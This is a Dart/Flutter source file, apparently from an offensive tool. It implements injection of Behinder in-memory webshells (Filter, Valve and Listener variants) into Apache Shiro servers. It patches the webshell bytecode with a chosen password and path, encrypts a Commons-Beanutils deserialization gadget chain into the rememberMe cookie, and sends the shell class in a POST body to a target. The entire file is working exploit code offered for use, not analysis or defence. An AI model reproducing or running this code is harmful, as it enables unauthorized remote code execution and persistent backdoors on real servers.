import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';

import 'package:flutter/services.dart' show rootBundle;
import 'package:http/http.dart' as http;

import 'shiro_crypto.dart';

enum MemShellType {
  filter('mem_shell/BehinderFilter.b64', 'Filter 型内存马'),
  valve('mem_shell/BehinderValve.b64', 'Valve 型内存马'),
  listener('mem_shell/BehinderListener.b64', 'Listener 型内存马');

  const MemShellType(this.assetFileName, this.displayName);

  final String assetFileName;
  final String displayName;
}

class MemShellInjectResult {
  final bool success;
  final int statusCode;
  final String message;

  const MemShellInjectResult({
    required this.success,
    required this.statusCode,
    required this.message,
  });
}

/// 内存冰蝎马字节码修补与注入服务。
///
/// 注入流程：
///   1. 从 assets 加载指定类型的 Behinder .class 字节码
///   2. 将默认密码 / URL 路径替换为用户自定义值（Java constant-pool UTF8 修补）
///   3. 构造 POST 请求：
///      - Cookie: rememberMe = AES-CBC/GCM( CB1-InjectMemTool 序列化链 )
///      - Body:   user = Base64( 修补后的 Behinder .class 字节 )
///   4. 服务器反序列化 Cookie → 执行 InjectMemTool → 读取 user 参数 → 注册内存马
class ShiroMemShellService {
  const ShiroMemShellService();

  static const _defaultPassword = 'eac9fa38330a7535';
  static const _defaultPath = '/favicondemo.ico';

  /// 加载并修补 Behinder .class 字节码
  Future<Uint8List> buildShellClass({
    required MemShellType type,
    required String password,
    required String path,
  }) async {
    final raw = await _loadB64Asset('data/${type.assetFileName}');
    if (raw.isEmpty) throw Exception('无法加载 ${type.assetFileName}，请确认 assets 已正确打包');
    var patched = _patchUtf8Constant(raw, _defaultPassword, password);
    patched = _patchUtf8Constant(patched, _defaultPath, path);
    return patched;
  }

  /// 加载内置 CB1-InjectMemTool 序列化链（不需要用户提供）
  Future<Uint8List> loadBuiltinChain() async {
    final chain = await _loadB64Asset('data/mem_shell/cb1_inject_mem_tool.b64');
    if (chain.isEmpty) throw Exception('无法加载内置 CB1-InjectMemTool 链');
    return chain;
  }

  /// 发送内存马注入请求：rememberMe Cookie + user POST 参数
  Future<MemShellInjectResult> inject({
    required String targetUrl,
    required String keyBase64,
    Uint8List? gadgetChainPayload, // null = 自动使用内置 CB1-InjectMemTool 链
    required Uint8List shellClassBytes,
    required String shellPath,
    required String shellPassword,
    ShiroEncryptionMode mode = ShiroEncryptionMode.cbc,
    String cookieName = 'rememberMe',
    Duration timeout = const Duration(seconds: 15),
    void Function(String)? onProgress,
  }) async {
    onProgress?.call('[*] 加载 InjectMemTool 链...');
    final chainPayload = gadgetChainPayload ?? await loadBuiltinChain();
    onProgress?.call('[*] 加密 InjectMemTool 链（${chainPayload.length} bytes）...');
    const crypto = ShiroCrypto();
    final encrypted = await crypto.encryptRememberMe(
      keyBase64: keyBase64,
      serializedPayload: chainPayload,
      mode: mode,
    );

    final shellB64 = base64.encode(shellClassBytes);
    onProgress?.call('[*] Shell 字节已编码（${shellClassBytes.length} bytes），正在发送...');

    final uri = Uri.parse(targetUrl);
    final client = http.Client();
    try {
      final req = http.Request('POST', uri)
        ..followRedirects = false
        ..headers.addAll({
          'Cookie': '$cookieName=$encrypted',
          'Content-Type': 'application/x-www-form-urlencoded',
          'Accept': 'text/html,application/xhtml+xml,*/*',
          'Accept-Encoding': 'gzip, deflate',
          'Accept-Language': 'zh-CN,zh;q=0.9',
          'Cache-Control': 'no-cache',
          'Connection': 'close',
          'User-Agent':
              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
          'path': shellPath,
          'p': shellPassword,
        })
        ..body = 'user=${Uri.encodeComponent(shellB64)}';

      final streamed = await client.send(req).timeout(timeout);
      final response = await http.Response.fromStream(streamed);

      onProgress?.call('[+] 注入请求已发送，HTTP: ${response.statusCode}');
      if (response.body.trim().isNotEmpty) {
        final body = response.body;
        final snippet = body.length > 300 ? '${body.substring(0, 300)}...' : body;
        onProgress?.call('[i] 响应体: $snippet');
      }

      return MemShellInjectResult(
        success: true,
        statusCode: response.statusCode,
        message: 'HTTP ${response.statusCode}',
      );
    } catch (e) {
      onProgress?.call('[!] 注入异常: $e');
      return MemShellInjectResult(success: false, statusCode: -1, message: e.toString());
    } finally {
      client.close();
    }
  }

  // ── helpers ──────────────────────────────────────────────────────────────

  static Future<Uint8List> _loadB64Asset(String assetPath) async {
    String b64;
    try {
      b64 = (await rootBundle.loadString(assetPath)).trim();
    } catch (_) {
      try {
        final f = File(assetPath);
        b64 = await f.exists() ? (await f.readAsString()).trim() : '';
      } catch (_) {
        b64 = '';
      }
    }
    if (b64.isEmpty) return Uint8List(0);
    final normalized = b64.replaceAll(RegExp(r'\s+'), '');
    return Uint8List.fromList(base64.decode(normalized));
  }

  /// 在 Java .class 字节中定位 constant-pool UTF8 条目并替换其内容。
  ///
  /// UTF8 条目格式：tag(0x01) | len_hi | len_lo | bytes…
  /// 若新旧值等长，直接替换；否则通过拼接字节数组重建（长度前缀同步更新）。
  static Uint8List _patchUtf8Constant(
      Uint8List bytes, String oldValue, String newValue) {
    final oldB = utf8.encode(oldValue);
    final newB = utf8.encode(newValue);

    for (int i = 0; i < bytes.length - oldB.length - 2; i++) {
      if (bytes[i] != 0x01) continue;
      final len = (bytes[i + 1] << 8) | bytes[i + 2];
      if (len != oldB.length) continue;

      bool match = true;
      for (int j = 0; j < oldB.length; j++) {
        if (bytes[i + 3 + j] != oldB[j]) {
          match = false;
          break;
        }
      }
      if (!match) continue;

      final builder = BytesBuilder(copy: false);
      builder.add(bytes.sublist(0, i + 1)); // tag 0x01
      builder.addByte((newB.length >> 8) & 0xFF);
      builder.addByte(newB.length & 0xFF);
      builder.add(newB);
      builder.add(bytes.sublist(i + 3 + oldB.length));
      return builder.toBytes();
    }
    return bytes; // constant not found — return unchanged
  }
}
